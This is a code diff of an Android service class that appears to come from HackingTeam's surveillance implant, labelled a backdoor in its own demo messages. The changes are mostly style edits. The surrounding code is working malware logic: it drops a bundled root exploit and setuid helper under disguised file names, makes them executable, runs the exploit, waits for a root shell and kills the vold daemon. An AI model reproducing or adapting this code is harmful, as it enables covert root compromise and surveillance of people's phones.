@@ -3,10 +3,7 @@ package com.android.service;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
-import java.io.FilePermission;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -59,34 +56,37 @@ public class ServiceCore extends Service {
 	}
 
 	private void setBackground() {
-		WallpaperManager wm = WallpaperManager.getInstance(this);
-		Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
+		final WallpaperManager wm = WallpaperManager.getInstance(this);
+		final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
 				.getDefaultDisplay();
-		int width = display.getWidth();
-		int height = display.getHeight();
-		Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
-		Canvas canvas = new Canvas(bitmap);
-		Paint paint = new Paint();
+		final int width = display.getWidth();
+		final int height = display.getHeight();
+		final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
+		final Canvas canvas = new Canvas(bitmap);
+		final Paint paint = new Paint();
 		paint.setStyle(Paint.Style.FILL);
 		paint.setAntiAlias(true);
 		paint.setTextSize(20);
 		canvas.drawText("HackingTeam", 10, 100, paint);
 		try {
 			wm.setBitmap(bitmap);
-		} catch (IOException e) {
-			if (Cfg.DEBUG)
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
 				Check.log(e);
+			}
 		}
 	}
 
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onDestroy)");
+		}
 
-		if (Cfg.DEMO)
+		if (Cfg.DEMO) {
 			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
+		}
 		core.Stop();
 		core = null;
 	}
@@ -106,8 +106,9 @@ public class ServiceCore extends Service {
 			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
 				Status.self().setRoot(root());
 			} else {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onStart) no media mounted");
+				}
 			}
 		}
 
@@ -120,19 +121,20 @@ public class ServiceCore extends Service {
 	private boolean root() {
 		try {
 			if (!Cfg.EXP) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " (root): Exploit disabled by conf");
+				}
 
 				return false;
 			}
 
-			String crashlog = "errorlog";
-			String exploit = "statuslog";
-			String suidext = "statusdb";
+			final String crashlog = "errorlog";
+			final String exploit = "statuslog";
+			final String suidext = "statusdb";
 			boolean isRoot = false;
 
 			// Creiamo il crashlog
-			FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
+			final FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
 			fos.close();
 
 			// Scriviamo l'exploit sul disco
@@ -142,7 +144,7 @@ public class ServiceCore extends Service {
 			is.read(content);
 			is.close();
 
-			FileOutputStream fsexpl = openFileOutput(exploit, MODE_PRIVATE);
+			final FileOutputStream fsexpl = openFileOutput(exploit, MODE_PRIVATE);
 			fsexpl.write(content);
 			fsexpl.close();
 
@@ -153,13 +155,13 @@ public class ServiceCore extends Service {
 			is.read(content);
 			is.close();
 
-			FileOutputStream fsext = openFileOutput(suidext, MODE_PRIVATE);
+			final FileOutputStream fsext = openFileOutput(suidext, MODE_PRIVATE);
 			fsext.write(content);
 			fsext.close();
 
 			// Eseguiamo l'exploit
-			File filesPath = getApplicationContext().getFilesDir();
-			String path = filesPath.getAbsolutePath();
+			final File filesPath = getApplicationContext().getFilesDir();
+			final String path = filesPath.getAbsolutePath();
 
 			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + exploit);
 			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + suidext);
@@ -167,11 +169,11 @@ public class ServiceCore extends Service {
 
 			final String exppath = path + "/" + exploit;
 
-			ExploitRunnable r = new ExploitRunnable(exppath);
+			final ExploitRunnable r = new ExploitRunnable(exppath);
 			new Thread(r).start();
 
 			// Attendiamo al max 100 secondi il nostro file setuid root
-			long now = System.currentTimeMillis();
+			final long now = System.currentTimeMillis();
 
 			while (System.currentTimeMillis() - now < 100 * 1000) {
 				Utils.sleep(1000);
@@ -182,8 +184,9 @@ public class ServiceCore extends Service {
 				}
 			}
 
-			if (r.getProcess() != null)
+			if (r.getProcess() != null) {
 				r.getProcess().destroy();
+			}
 
 			if (isRoot) {
 				// Killiamo VOLD per due volte
@@ -210,7 +213,7 @@ public class ServiceCore extends Service {
 				}
 
 			}
-		} catch (Exception e1) {
+		} catch (final Exception e1) {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);
@@ -227,19 +230,20 @@ public class ServiceCore extends Service {
 
 		try {
 			// Verifichiamo di essere root
-			AutoFile file = new AutoFile(shellFile);
+			final AutoFile file = new AutoFile(shellFile);
 			if (file.exists() && file.canRead()) {
-				Process p = Runtime.getRuntime().exec(shellFile + " air");
+				final Process p = Runtime.getRuntime().exec(shellFile + " air");
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						Log.d("QZ", TAG + " (checkRoot): isRoot YEAHHHHH");
+					}
 
 					isRoot = true;
 				}
 			}
-		} catch (Exception e) {
+		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(e);
 			}
@@ -251,7 +255,7 @@ public class ServiceCore extends Service {
 	// Exploit thread
 	class ExploitRunnable implements Runnable {
 		private Process localProcess;
-		private String exppath;
+		private final String exppath;
 
 		public ExploitRunnable(String exppath) {
 			this.exppath = exppath;
@@ -265,10 +269,10 @@ public class ServiceCore extends Service {
 			try {
 				localProcess = Runtime.getRuntime().exec(exppath);
 
-				BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
-				BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
-				BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
-				String full = null;
+				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
+				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
+				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
+				final String full = null;
 				String line = null;
 
 				while ((line = stdout.readLine()) != null) {
@@ -285,22 +289,23 @@ public class ServiceCore extends Service {
 
 				try {
 					localProcess.waitFor();
-				} catch (InterruptedException e) {
+				} catch (final InterruptedException e) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (waitFor): " + e);
 						Check.log(e);
 					}
 				}
 
-				int exitValue = localProcess.exitValue();
-				if (Cfg.DEBUG)
+				final int exitValue = localProcess.exitValue();
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " (waitFor): exitValue " + exitValue);
+				}
 
 				stdin.close();
 				stdout.close();
 				stderr.close();
 
-			} catch (IOException e) {
+			} catch (final IOException e) {
 				localProcess = null;
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e);
